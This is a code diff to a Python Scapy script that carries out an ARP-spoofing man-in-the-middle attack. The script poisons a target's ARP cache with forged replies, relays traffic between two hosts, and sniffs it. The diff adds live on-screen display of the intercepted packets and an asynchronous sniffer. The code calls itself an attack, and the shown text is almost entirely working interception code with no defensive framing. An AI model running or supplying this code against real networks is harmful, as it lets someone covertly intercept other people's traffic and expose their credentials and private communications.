@@ -58,16 +58,16 @@ def getApplicationProtocol(packet):
     
     return protocols
 
-def arpSpoof(target2, spoofIp, iface):
+def arpSpoof(target, spoofIp, iface):
     """Send ARP spoof packets to poison the target's ARP cache."""
-    pkt = ARP(op=2, pdst=target2, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
-    print(f"Sending ARP spoof packets to target {target2}, impersonating {spoofIp}.")
+    pkt = ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
+    print(f"Sending ARP spoof packets to target {target}, impersonating {spoofIp}.")
     while running:
         send(pkt, iface=iface, verbose=False)
         time.sleep(1)
 
 def forwardPacket(pkt, target1, target2, iface):
-    """Forward packets only between victim and target."""
+    """Forward packets only between target1 and target2."""
     if pkt.haslayer(IP):
         if (pkt[IP].src == target1 and pkt[IP].dst == target2) or \
            (pkt[IP].src == target2 and pkt[IP].dst == target1):
@@ -145,7 +145,7 @@ def generateHtmlReport(txtFilename):
         print("HTML report generated: report.html")
 
 def sniffPackets(target1, target2, iface, log=False):
-    """Sniff packets, forward them, and optionally log to a text file."""
+    """Sniff packets, forward them, display on screen, and optionally log to a text file."""
     txt_file = None
     if log:
         txtFilename = "sniffingData.txt"
@@ -162,12 +162,36 @@ def sniffPackets(target1, target2, iface, log=False):
                 forwardPacket(pkt, target1, target2, iface)
                 if log:
                     logPacket(pkt, txt_file)
+                # Display packet on screen
+                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+                src_ip = pkt[IP].src
+                dst_ip = pkt[IP].dst
+                transport = "Other"
+                sport = ""
+                dport = ""
+                if pkt.haslayer("TCP"):
+                    transport = "TCP"
+                    sport = pkt["TCP"].sport
+                    dport = pkt["TCP"].dport
+                elif pkt.haslayer("UDP"):
+                    transport = "UDP"
+                    sport = pkt["UDP"].sport
+                    dport = pkt["UDP"].dport
+                elif pkt.haslayer("ICMP"):
+                    transport = "ICMP"
+                protocols = getApplicationProtocol(pkt)
+                app_protocols = ",".join(protocols) if protocols else "None"
+                print(f"{timestamp} - {src_ip}:{sport} -> {dst_ip}:{dport} [{transport}] {app_protocols}")
     
+    sniffer = AsyncSniffer(iface=iface, filter="ip", prn=packetHandler, store=0)
+    sniffer.start()
     try:
-        sniff(iface=iface, filter="ip", prn=packetHandler, store=0, timeout=None)
+        while running:
+            time.sleep(1)
     except KeyboardInterrupt:
         print("\nStopping packet sniffing.")
     finally:
+        sniffer.stop()
         if txt_file:
             txt_file.close()
             if log:
@@ -212,7 +236,6 @@ def signalHandler(sig, frame):
     global running
     print("\nGracefully stopping attack...")
     running = False
-    # Sniffing will stop via KeyboardInterrupt, and report generation will follow if enabled.
 
 def main():
     signal.signal(signal.SIGINT, signalHandler)
